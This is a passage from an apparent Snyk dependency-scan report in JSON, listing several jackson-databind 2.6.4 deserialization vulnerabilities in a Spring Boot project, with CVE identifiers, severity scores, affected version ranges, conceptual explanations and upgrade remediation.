      "exploit": "Proof of Concept",
      "fixedIn": [
        "2.6.7.4",
        "2.9.10.4"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ObjectMapper",
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.0.0,2.9.10.4)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.0.0,2.9.10.4)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-561585",
      "identifiers": {
        "CVE": [
          "CVE-2020-11113"
        ],
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-9vvp-fxw6-jcxr"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2021-05-02T13:21:39.755787Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-03-31T06:16:36Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/e2ba12d5d60715d95105e3e790fc234cfb59893d"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2670"
        },
        {
          "title": "PoC",
          "url": "https://github.com/Al1ex/CVE-2020-11113"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.6.7.4)",
          "[2.7.0,2.9.10.4)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@2.0.0.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2020-03-31T09:28:18.821103Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. It mishandles the interaction between serialization gadgets and typing, related to gadgets `org.apache.activemq.*` (aka activemq-jms, activemq-core, activemq-pool, and activemq-pool-jms).\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Don’t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.4, 2.9.10.4 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/c14c9f99ed030dbd1440129585f03440c8758a99)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2664)\n",
      "disclosureTime": "2020-03-31T06:16:37Z",
      "exploit": "Unproven",
      "fixedIn": [
        "2.6.7.4",
        "2.9.10.4"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ObjectMapper",
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.4)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.4)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-561586",
      "identifiers": {
        "CVE": [
          "CVE-2020-11111"
        ],
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-v3xw-c963-f5hc"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2021-05-02T13:21:40.308804Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-03-31T06:16:37Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/c14c9f99ed030dbd1440129585f03440c8758a99"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2664"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.6.7.4)",
          "[2.7.0,2.9.10.4)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@2.0.0.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2020-03-31T09:29:29.728517Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. It mishandles the interaction between serialization gadgets and typing, related to gadget  `org.apache.commons.proxy.provider.remoting.RmiProvider` (aka apache/commons-proxy).\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Don’t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.4, 2.9.10.4 or higher.\n## References\n- [GItHub Commit](https://github.com/FasterXML/jackson-databind/commit/05d7e0e13f43e12db6a51726df12c8b4d8040676)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2666)\n",
      "disclosureTime": "2020-03-31T06:16:37Z",
      "exploit": "Unproven",
      "fixedIn": [
        "2.6.7.4",
        "2.9.10.4"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ObjectMapper",
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.4)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.4)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-561587",
      "identifiers": {
        "CVE": [
          "CVE-2020-11112"
        ],
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-58pp-9c76-5625"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2021-05-02T13:21:43.982026Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-03-31T06:16:37Z",
      "references": [
        {
          "title": "GItHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/05d7e0e13f43e12db6a51726df12c8b4d8040676"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2666"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.6.7.4)",
          "[2.7.0,2.9.10.4)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@2.0.0.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2020-04-08T10:55:38.169333Z",
      "credit": [
        "Tatu Saloranta"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. It mishandles the interaction between serialization gadgets and typing, related to `org.apache.commons.jelly.impl.Embedded` (aka `commons-jelly`).\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Don’t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.4, 2.9.10.4 or higher.\n## References\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2682)\n- [Medium Post](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n",
      "disclosureTime": "2020-04-08T00:42:23Z",
      "exploit": "Unproven",
      "fixedIn": [
        "2.6.7.4",
        "2.9.10.4"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ObjectMapper",
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.4)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.4)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-564887",
      "identifiers": {
        "CVE": [
          "CVE-2020-11620"
        ],
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-h4rc-386g-6m85"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2020-11-15T15:46:01.440316Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-04-08T00:42:23Z",
      "references": [
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2682"
        },
        {
          "title": "Medium Post",
          "url": "https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.6.7.4)",
          "[2.7.0,2.9.10.4)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@2.0.0.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2020-04-08T10:59:04.995807Z",
      "credit": [
        "Tatu Saloranta"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. It mishandles the interaction between serialization gadgets and typing, related to `org.springframework.aop.config.MethodLocatingFactoryBean` (aka `spring-aop`).\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Don’t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.4, 2.9.10.4 or higher.\n## References\n- [GitHub Issues](https://github.com/FasterXML/jackson-databind/issues/2680)\n- [Medium Post](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n",
      "disclosureTime": "2020-04-08T00:42:25Z",
      "exploit": "Unproven",
      "fixedIn": [
        "2.6.7.4",
        "2.9.10.4"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ObjectMapper",
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.0.0,2.9.10.4)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.0.0,2.9.10.4)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-564888",
      "identifiers": {
        "CVE": [
          "CVE-2020-11619"
        ],
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-27xj-rqx5-2255"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2021-05-02T13:21:40.174222Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-04-08T00:42:25Z",
      "references": [
        {
          "title": "GitHub Issues",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2680"
        },
        {
          "title": "Medium Post",
          "url": "https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.6.7.4)",
          "[2.7.0,2.9.10.4)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@2.0.0.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2020-05-29T15:36:30.302636Z",
      "credit": [
        "XuYuanzhen"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. It is possible to conduct a Deserialization attack using the `com.sun.org.apache.xalan.internal.lib.sql.JNDIConnectionPool`  (`xalan2`) class gadget if polymorphic type handling is enabled and an application using this package allows user input which gets deserialized. \r\n\r\nNote: This vulnerability does not affect release `2.10.0` onward.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Don’t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.4, 2.9.10.5 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/840eae2ca81c597a0010b2126f32dce17d384b70)\n- [Github Issue](https://github.com/FasterXML/jackson-databind/issues/2704)\n",
      "disclosureTime": "2020-05-01T15:36:06Z",
      "exploit": "Unproven",
      "fixedIn": [
        "2.6.7.4",
        "2.9.10.5"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ObjectMapper",
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.10.0)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.10.0)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-570625",
      "identifiers": {
        "CVE": [
          "CVE-2020-14062"
        ],
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-c265-37vj-cwcc"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2021-05-02T13:21:46.643438Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-05-29T15:36:05Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/840eae2ca81c597a0010b2126f32dce17d384b70"
        },
        {
          "title": "Github Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2704"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.6.7.4)",
          "[2.7.0,2.9.10.5)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@2.0.0.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2020-06-14T14:48:40.820120Z",
      "credit": [
        "Al1ex@knownsec"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. The package mishandles the interaction between serialization gadgets and typing, related to `org.jsecurity.realm.jndi.JndiRealmFactory`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Don’t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson 